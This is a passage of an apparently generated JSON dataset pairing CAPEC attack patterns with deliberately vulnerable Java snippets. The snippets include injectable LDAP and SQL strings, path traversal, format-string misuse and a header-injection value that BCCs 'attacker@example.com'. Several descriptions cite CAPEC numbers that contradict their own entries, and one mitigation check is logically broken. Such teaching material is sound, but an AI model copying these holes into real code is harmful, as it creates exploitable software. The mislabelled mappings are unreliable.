        "description": "This Java code snippet demonstrates an 'Excessive Allocation' attack by allocating a large amount of memory in response to a single request. The `allocateExcessiveMemory` method allocates 1MB chunks of memory in a loop, without any limit or throttling, which can quickly exhaust the available memory resources. This example embodies CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption). The code does not handle resource limits properly, leading to potential denial of service due to memory exhaustion."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class ResourceLeakExample {\n    public static void main(String[] args) {\n        BufferedReader reader = null;\n        try {\n            reader = new BufferedReader(new FileReader(\"example.txt\"));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            // Improper resource shutdown or release (CWE-404)\n            // Missing release of resource after effective lifetime (CWE-772)\n            // The resource is not properly closed, leading to a resource leak\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a resource leak vulnerability. The code attempts to read a file line by line using a BufferedReader. However, it fails to properly close the BufferedReader in the finally block, which is a common mistake leading to resource leaks (CWE-404 and CWE-772). This can deplete the number of file handles available to the system, potentially causing a denial of service. The code represents the main idea of the CAPEC by showing how an adversary could exploit such a resource leak to deplete system resources."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class SymlinkAttackExample {\n    public static void main(String[] args) {\n        String userInputPath = \"/tmp/user_input\"; // This should be sanitized and validated\n        Path path = Paths.get(userInputPath);\n\n        try {\n            // Check if the file is a symbolic link\n            if (Files.isSymbolicLink(path)) {\n                System.out.println(\"Error: Symbolic links are not allowed.\");\n                return;\n            }\n\n            // Check if the file is a hard link\n            BasicFileAttributes attrs = Files.readAttributes(path, BasicFileAttributes.class);\n            if (attrs.fileKey() != null && Files.isRegularFile(path)) {\n                System.out.println(\"Error: Hard links are not allowed.\");\n                return;\n            }\n\n            // Proceed with file operations\n            File file = path.toFile();\n            if (file.exists()) {\n                System.out.println(\"File exists: \" + file.getAbsolutePath());\n            } else {\n                System.out.println(\"File does not exist.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic approach to mitigating symlink and hard link attacks. The code first checks if the provided path is a symbolic link using `Files.isSymbolicLink()`. If it is, the program prints an error message and exits. Next, it checks if the file is a hard link by reading its attributes and verifying if it is a regular file with a non-null file key. If it is a hard link, the program prints an error message and exits. If neither condition is met, the program proceeds with file operations. This approach helps prevent unauthorized file access by ensuring that the file being accessed is not a symlink or hard link, addressing the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "public class Application {\n    public static void main(String[] args) {\n        for (String arg : args) {\n            switch (arg) {\n                case \"--debug\":\n                    enableDebugMode();\n                    break;\n                case \"--verbose\":\n                    enableVerboseMode();\n                    break;\n                // Potentially hidden or undocumented switch\n                case \"--admin\":\n                    enableAdminMode();\n                    break;\n                default:\n                    System.out.println(\"Unknown option: \" + arg);\n            }\n        }\n    }\n\n    private static void enableDebugMode() {\n        System.out.println(\"Debug mode enabled\");\n        // Debug information that could reveal sensitive data\n    }\n\n    private static void enableVerboseMode() {\n        System.out.println(\"Verbose mode enabled\");\n        // Verbose logging\n    }\n\n    private static void enableAdminMode() {\n        System.out.println(\"Admin mode enabled\");\n        // Hidden functionality that should not be accessible\n    }\n}",
        "description": "This Java code snippet represents an application that processes command-line arguments to enable different modes. The main idea of the CAPEC 'Try All Common Switches' is embodied by the presence of multiple switches, including a potentially hidden or undocumented '--admin' switch. This hidden functionality (CWE-912) could be exploited by an attacker trying all possible switches. The '--debug' switch could reveal sensitive information (CWE-1296), and the code does not handle unknown switches robustly (CWE-184). The code demonstrates how an attacker might discover and exploit such switches to gain unauthorized access or information."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailInjectionExample {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String subject = \"Test Email\";\n        String body = \"Hello, this is a test email.\";\n        String maliciousInput = \"\\nBCC: attacker@example.com\";\n\n        sendEmail(to, subject, body + maliciousInput);\n    }\n\n    public static void sendEmail(String to, String subject, String body) {\n        String from = \"sender@example.com\";\n        String host = \"smtp.example.com\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(subject);\n            message.setText(body);\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an email injection vulnerability. The `sendEmail` method constructs an email message using input parameters for the recipient, subject, and body. The `main` method appends a malicious input string (`\\nBCC: attacker@example.com`) to the email body, which could manipulate the email headers to add a BCC recipient without the original sender's knowledge. This example embodies the CAPEC 'Email Injection' by showing how delimiter characters (newline in this case) can be used to inject additional headers. The related CWEs are represented by the improper neutralization of special elements (CWE-150, CWE-116, CWE-147) and the potential for command injection (CWE-77)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class FormatStringVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your name:\");\n        String userInput = scanner.nextLine();\n        // Vulnerable code: using user input directly in format string\n        System.out.printf(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string injection vulnerability. The program prompts the user to enter their name and then uses the user-provided input directly in the format string of the printf function. This is dangerous because if the user input contains format specifiers (e.g., %s, %n), it can lead to unexpected behavior, such as reading or writing to memory locations. This vulnerability is related to CWE-134 (Use of Externally-Controlled Format String) as the format string originates from an external source (user input). It also touches on CWE-20 (Improper Input Validation) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) since the input is not validated or sanitized before being used."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.SearchControls;\nimport javax.naming.directory.SearchResult;\nimport javax.naming.directory.Attributes;\nimport java.util.Hashtable;\n\npublic class LDAPInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"*\"; // Simulating user input that could be malicious\n        String ldapSearchBase = \"ou=users,dc=example,dc=com\";\n        String ldapSearchFilter = \"(uid=\" + userInput + \")\";\n\n        Hashtable<String, String> env = new Hashtable<>();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL, \"ldap://localhost:389\");\n\n        try {\n            DirContext ctx = new InitialDirContext(env);\n            SearchControls searchControls = new SearchControls();\n            searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n            javax.naming.NamingEnumeration<SearchResult> results = ctx.search(ldapSearchBase, ldapSearchFilter, searchControls);\n\n            while (results.hasMore()) {\n                SearchResult searchResult = results.next();\n                Attributes attributes = searchResult.getAttributes();\n                System.out.println(attributes);\n            }\n            ctx.close();\n        } catch (NamingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic LDAP query that is vulnerable to LDAP Injection. The user input is directly concatenated into the LDAP search filter without any validation or sanitization, allowing an attacker to manipulate the query. In this example, the user input is set to '*', which could potentially return all users in the LDAP directory. This code embodies the main idea of CAPEC-90 (LDAP Injection) and highlights related weaknesses such as improper neutralization of special elements (CWE-90) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String query = \"SELECT * FROM users WHERE username='\" + userInput + \"'\";\n        // Execute the query (omitted for brevity)\n        response.getWriter().println(\"Query executed: \" + query);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to parameter injection. The servlet takes a user input from an HTTP GET request parameter named 'input' and directly incorporates it into an SQL query string without proper validation or encoding. This can allow an attacker to manipulate the query by injecting special characters or additional parameters, potentially leading to SQL injection or other security issues. The code snippet embodies the main idea of CAPEC-137 (Parameter Injection) and highlights related weaknesses such as CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-116 (Improper Encoding or Escaping of Output)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class ReflectionInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java ReflectionInjectionExample <className> <methodName>\");\n            return;\n        }\n\n        String className = args[0];\n        String methodName = args[1];\n\n        try {\n            // Load the class specified by the user\n            Class<?> cls = Class.forName(className);\n\n            // Get the method specified by the user\n            Method method = cls.getMethod(methodName);\n\n            // Invoke the method (assuming it is static and takes no parameters for simplicity)\n            method.invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n// Example of a class that could be loaded\nclass MaliciousClass {\n    public static void maliciousMethod() {\n        System.out.println(\"Malicious code executed!\");\n    }\n}",
        "description": "This Java code snippet demonstrates a reflection injection vulnerability. The program takes two command-line arguments: the name of a class and the name of a method. It then uses Java's reflection API to load the specified class and invoke the specified method. If an attacker can control the input to this program, they could potentially load and execute arbitrary classes and methods, including malicious ones. This embodies the main idea of the CAPEC 'Reflection Injection' by showing how an adversary can supply values that are used by reflection methods to identify and invoke classes and methods, leading to potential security risks such as executing malicious code."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n\n        try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a relative path traversal vulnerability. The program takes a filename as a command-line argument and attempts to read and print the contents of the file located in the '/var/www/uploads/' directory. However, it does not properly validate or sanitize the input filename, allowing an attacker to supply a path like '../../etc/passwd' to access sensitive files outside the intended directory. This embodies the main idea of CAPEC-126 (Relative Path Traversal) and related CWEs, where improper input validation allows traversal to unintended directories."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class MultiFormServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String currentStep = request.getParameter(\"step\");\n        String userId = request.getParameter(\"userId\");\n\n        // Incomplete Internal State Distinction (CWE-372)\n        if (currentStep == null || userId == null) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid request\");\n            return;\n        }\n\n        // External Control of Assumed-Immutable Web Parameter (CWE-472)\n        if (!isValidStep(currentStep)) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid step\");\n            return;\n        }\n\n        // Authorization Bypass Through User-Controlled Key (CWE-639)\n        if (!isAuthorized(userId, currentStep)) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Unauthorized access\");\n            return;\n        }\n\n        // Reliance on Untrusted Inputs in a Security Decision (CWE-807)\n        if (!isExpectedStepSequence(userId, currentStep)) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Unexpected step sequence\");\n            return;\n        }\n\n        // Process the form step\n        processStep(request, response, currentStep);\n    }\n\n    private boolean isValidStep(String step) {\n        // Validate the step parameter\n        return step.matches(\"step[1-3]\");\n    }\n\n    private boolean isAuthorized(String userId, String step) {\n        // Check if the user is authorized to access the step\n        // This is a placeholder for actual authorization logic\n        return true;\n    }\n\n    private boolean isExpectedStepSequence(String userId, String step) {\n        // Check if the step sequence is as expected\n        // This is a placeholder for actual sequence validation logic\n        return true;\n    }\n\n    private void processStep(HttpServletRequest request, HttpServletResponse response, String step) throws IOException {\n        // Process the form step\n        response.getWriter().write(\"Processing \" + step);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a multi-step form submission process vulnerable to the 'Bypassing of Intermediate Forms in Multiple-Form Sets' attack. The code checks the current step and user ID parameters but does not enforce a strict sequence of form submissions. The vulnerabilities include: (1) Incomplete Internal State Distinction (CWE-372) where the application does not properly track the form sequence state, (2) External Control of Assumed-Immutable Web Parameter (CWE-472) where the 'step' parameter can be manipulated, (3) Authorization Bypass Through User-Controlled Key (CWE-639) where the user ID can be tampered with, and (4) Reliance on Untrusted Inputs in a Security Decision (CWE-807) where the step sequence is not securely validated. This can allow an attacker to skip steps or submit forms out of order, leading to incomplete or incorrect data processing."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CachePoisoningExample {\n    private static Map<String, String> cache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate fetching data from a less trusted source\n        String data = fetchDataFromUntrustedSource(\"key1\");\n        cache.put(\"key1\", data);\n\n        // Simulate fetching data from a trusted source\n        String trustedData = fetchDataFromTrustedSource(\"key1\");\n        cache.put(\"key1\", trustedData);\n\n        // Accessing the cache\n        String cachedData = cache.get(\"key1\");\n        System.out.println(\"Cached Data: \" + cachedData);\n    }\n\n    private static String fetchDataFromUntrustedSource(String key) {\n        // Simulate untrusted data\n        return \"untrusted_data\";\n    }\n\n    private static String fetchDataFromTrustedSource(String key) {\n        // Simulate trusted data\n        return \"trusted_data\";\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of cache poisoning. The cache is a simple HashMap that stores data. The code fetches data from both a less trusted source and a trusted source, but it does not properly verify the authenticity or origin of the data before storing it in the cache. This can lead to the cache being poisoned with incorrect or harmful data from the untrusted source. The code highlights the vulnerabilities described in the related CWEs, such as using less trusted sources (CWE-348), insufficient verification of data authenticity (CWE-345), and acceptance of untrusted data with trusted data (CWE-349)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSCachePoisoningExample {\n    private static Map<String, String> dnsCache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding a trusted DNS entry\n        dnsCache.put(\"www.example.com\", \"93.184.216.34\");\n\n        // Simulate a DNS cache poisoning attack\n        dnsCache.put(\"www.example.com\", \"192.168.1.100\");\n\n        // Attempt to resolve the domain name\n        String ipAddress = resolveDomain(\"www.example.com\");\n        System.out.println(\"Resolved IP Address: \" + ipAddress);\n    }\n\n    public static String resolveDomain(String domain) {\n        // Check the local DNS cache first\n        if (dnsCache.containsKey(domain)) {\n            return dnsCache.get(domain);\n        }\n\n        // Fallback to actual DNS resolution\n        try {\n            InetAddress inetAddress = InetAddress.getByName(domain);\n            return inetAddress.getHostAddress();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DNS cache poisoning. The `dnsCache` map simulates a local DNS cache. Initially, a trusted DNS entry is added to the cache. Then, a DNS cache poisoning attack is simulated by overwriting the trusted entry with a malicious IP address. The `resolveDomain` method first checks the local DNS cache for the domain name and returns the cached IP address if found. If the domain is not in the cache, it falls back to actual DNS resolution. This example embodies the main idea of DNS cache poisoning (CAPEC-147) and highlights related weaknesses such as insufficient verification of data authenticity (CWE-345) and acceptance of extraneous untrusted data with trusted data (CWE-349)."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class SensitiveFileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        File file = new File(\"/var/www/html/\" + filePath);\n        if (file.exists() && !file.isDirectory()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            response.setContentLength((int) file.length());\n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            os.close();\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where sensitive files stored under the web root directory can be accessed without proper authorization. The servlet reads a file path from the request parameter and serves the file if it exists. This embodies the CAPEC 'Detect Unpublicized Web Pages' by allowing an adversary to access files that were not intended to be publicized. The code is vulnerable to CWE-425 (Direct Request), CWE-219 (Storage of File with Sensitive Data Under Web Root), and CWE-612 (Improper Authorization of Index Containing Sensitive Information) as it does not enforce proper access controls or authorization checks."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/hiddenService\")\npublic class HiddenService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No authentication or authorization checks\n        response.getWriter().println(\"This is a hidden service\");\n    }\n}\n\n// Exposing WSDL file\n@WebServlet(\"/wsdl\")\npublic class WSDLService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.getWriter().println(\"<wsdl:definitions>...</wsdl:definitions>\");\n    }\n}\n\n// Downloading code without integrity check\n@WebServlet(\"/download\")\npublic class DownloadService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No integrity check\n        response.getWriter().println(\"Downloading code...\");\n    }\n}\n\n// Exposing version-control repository\n@WebServlet(\"/repo\")\npublic class RepoService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Exposing repository\n        response.getWriter().println(\"Repository contents...\");\n    }\n}\n\n// Omitting security-relevant information\n@WebServlet(\"/log\")\npublic class LogService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No logging of security-relevant information\n        response.getWriter().println(\"Logging service\");\n    }\n}",
        "description": "This Java code snippet demonstrates a web application with several vulnerabilities related to the CAPEC 'Detect Unpublicized Web Services' and the associated CWEs. The code includes:\n\n1. A hidden service (`/hiddenService`) that lacks authentication and authorization checks (CWE-425).\n2. A WSDL service (`/wsdl`) that exposes sensitive information about web services (CWE-651).\n3. A download service (`/download`) that downloads code without performing an integrity check (CWE-494).\n4. A repository service (`/repo`) that exposes version-control repository contents to unauthorized users (CWE-527).\n5. A logging service (`/log`) that omits security-relevant information (CWE-223).\n\nThe code illustrates how unpublicized web services can be vulnerable due to inadequate security controls, making them potential targets for adversaries."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\npublic class ChecksumSpoofingExample {\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String message = \"Sensitive data\";\n        String checksum = generateChecksum(message);\n\n        // Simulate message modification by an adversary\n        String modifiedMessage = \"Tampered data\";\n        String spoofedChecksum = generateChecksum(modifiedMessage);\n\n        // Receiver verifies the message\n        if (verifyChecksum(modifiedMessage, spoofedChecksum)) {\n            System.out.println(\"Message integrity verified.\");\n        } else {\n            System.out.println(\"Message integrity compromised.\");\n        }\n    }\n\n    public static String generateChecksum(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        byte[] digest = md.digest(data.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (byte b : digest) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n\n    public static boolean verifyChecksum(String data, String checksum) throws NoSuchAlgorithmException {\n        String newChecksum = generateChecksum(data);\n        return newChecksum.equals(checksum); // CWE-354: Improper Validation of Integrity Check Value\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of checksum spoofing. The `generateChecksum` method uses the MD5 hashing algorithm (CWE-328: Use of Weak Hash) to create a checksum for a given message. The `verifyChecksum` method checks if the checksum of the received message matches the provided checksum (CWE-354: Improper Validation of Integrity Check Value). In the main method, an adversary modifies the original message and generates a new checksum for the tampered message. The receiver then verifies the integrity of the modified message using the spoofed checksum, which falsely indicates that the message integrity is intact. This example highlights the vulnerability of using weak hash functions and improper validation of integrity check values, which can be exploited for checksum spoofing attacks."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import javax.xml.XMLConstants;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Validator;\nimport org.w3c.dom.Document;\nimport java.io.File;\nimport java.io.IOException;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\n\npublic class XMLSchemaPoisoningExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File xmlFile = new File(\"data.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(xmlFile);\n\n            // Load external schema file (potentially poisoned)\n            File schemaFile = new File(\"schema.xsd\");\n            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n            Schema schema = schemaFactory.newSchema(schemaFile);\n\n            // Validate XML against the schema\n            Validator validator = schema.newValidator();\n            validator.validate(new DOMSource(doc));\n\n            System.out.println(\"XML is valid against the schema.\");\n        } catch (SAXException | IOException | ParserConfigurationException e) {\n            System.out.println(\"XML is not valid: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an XML file is validated against an external XML schema. The code loads an XML file and an external schema file, then validates the XML against the schema. This setup is vulnerable to XML Schema Poisoning (CAPEC-170) because the schema file is externally controlled and can be modified by an attacker. If the schema is poisoned, it can undermine the security of the application processing the XML. The code also touches on related CWEs: CWE-15 (External Control of System or Configuration Setting) by allowing external control of the schema file, CWE-112 (Missing XML Validation) by showing the importance of validation, and CWE-91 (XML Injection) by highlighting the potential for schema manipulation."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class XMLPingOfDeath {\n    public static void main(String[] args) throws Exception {\n        String xmlPayload = \"<ping>\" + \"a\".repeat(1000) + \"</ping>\";\n        for (int i = 0; i < 10000; i++) {\n            processXML(xmlPayload);\n        }\n    }\n\n    public static void processXML(String xml) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document document = builder.parse(new InputSource(new StringReader(xml)));\n        // Simulate processing of the XML document\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an XML Ping of Death attack. The main idea is to send a large number of small XML messages rapidly to deplete the target's resources, causing a denial of service. The `main` method generates a repetitive XML payload and calls the `processXML` method in a loop to simulate the attack. The `processXML` method parses the XML string, which consumes resources. This example embodies CWE-400 (Uncontrolled Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of XML messages processed. Additionally, it lacks proper XML validation (CWE-112), which could be exploited further."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Simulate content modification (spoofing)\n            String spoofedContent = content.toString().replace(\"Original Content\", \"Spoofed Content\");\n\n            // Display the spoofed content\n            System.out.println(spoofedContent);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing. The program fetches content from a specified URL (http://example.com) and reads the content line by line. It then simulates content spoofing by replacing 'Original Content' with 'Spoofed Content' in the fetched content. Finally, it prints the spoofed content to the console. This example embodies the main idea of CAPEC-139 (Content Spoofing) by showing how an adversary could modify the content of a web page while keeping the apparent source unchanged. The code also touches on related CWEs such as CWE-345 (Insufficient Verification of Data Authenticity) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not verifying the authenticity or integrity of the fetched content."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class InsecureTempFile {\n    public static void main(String[] args) {\n        try {\n            // Predictable temporary file name\n            String tempFileName = \"tempfile_\" + System.currentTimeMillis() + \".txt\";\n            File tempFile = new File(\"/tmp/\" + tempFileName);\n\n            // Create the temporary file with insecure permissions\n            if (tempFile.createNewFile()) {\n                System.out.println(\"Temporary file created: \" + tempFile.getAbsolutePath());\n            }\n\n            // Set insecure permissions (world-readable and writable)\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n            Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of a temporary file with a predictable name in a directory with insecure permissions. The file is created in the '/tmp/' directory with a name based on the current timestamp, making it predictable. Additionally, the file is assigned world-readable and writable permissions, making it insecure. This code embodies the main idea of CAPEC-61 by showing how an attacker could predict temporary file names and exploit insecure permissions (CWE-377, CWE-378, CWE-379) to launch further attacks. The code also touches on CWE-73 and CWE-41 by illustrating potential issues with external control of file paths and improper resolution of path equivalence."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        // Example of a common resource location\n        File configFile = new File(\"/etc/config.txt\");\n        \n        // Check if the file exists and is readable\n        if (configFile.exists() && configFile.canRead()) {\n            try (FileInputStream fis = new FileInputStream(configFile)) {\n                byte[] data = new byte[(int) configFile.length()];\n                fis.read(data);\n                String configContent = new String(data, \"UTF-8\");\n                \n                // Print the content of the configuration file\n                System.out.println(\"Config File Content: \" + configContent);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Config file is not accessible.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' (CAPEC-168). The code attempts to read a configuration file located in a common directory (/etc/config.txt) on a Unix system. If the file exists and is readable, it reads the file's content and prints it to the console. This example highlights the vulnerability where sensitive files or directories are accessible to unauthorized actors (CWE-552). The code does not implement any security measures to restrict access to the configuration file, making it susceptible to exploitation by adversaries who know the common location of such files."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
